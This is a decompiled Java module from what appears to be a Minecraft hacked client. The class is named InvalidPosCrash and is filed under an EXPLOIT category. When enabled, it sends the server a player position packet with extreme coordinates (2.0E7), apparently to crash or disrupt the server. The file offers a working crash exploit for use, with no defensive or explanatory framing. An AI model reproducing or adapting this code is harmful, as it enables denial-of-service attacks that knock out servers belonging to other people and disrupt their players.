//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\user\Desktop\1.12 stable mappings"!

//Decompiled by Procyon!

package cc.candy.candymod.module.crash;

import cc.candy.candymod.module.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;

public class InvalidPosCrash extends Module
{
    public InvalidPosCrash() {
        super("InvalidPosCrash", Categories.EXPLOIT, false, false);
    }
    
    @Override
    public void onEnable() {
        if (this.nullCheck()) {
            return;
        }
        InvalidPosCrash.mc.player.connection.sendPacket((Packet)new CPacketPlayer.Position(2.0E7, 255.0, 2.0E7, true));
    }
}
